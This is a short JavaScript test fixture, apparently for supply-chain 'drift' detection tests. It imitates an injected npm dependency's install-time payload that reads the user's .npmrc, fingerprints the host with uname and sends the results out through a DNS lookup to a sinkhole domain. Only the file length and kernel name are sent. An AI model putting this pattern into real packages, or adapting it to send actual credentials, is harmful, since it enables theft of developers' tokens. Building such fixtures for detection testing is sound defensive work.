// SYNTHETIC FIXTURE for drift tests. Not real malware. Never run outside the sandbox.
// Recreates an injected dependency's install-time payload: read the npm config, fingerprint the
// host and report both to a remote name. The name is under the drift sinkhole, and only the
// config's length and the kernel name are sent.
'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const dns = require('dns');
const { execSync } = require('child_process');

function main() {
  let length = 0;
  try {
    length = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8').length;
  } catch (_) {
    // No config: report zero.
  }
  const kernel = execSync('uname').toString().trim().toLowerCase();
  dns.lookup(kernel + '-' + length + '.sinkhole.invalid', () => {});
}

main();
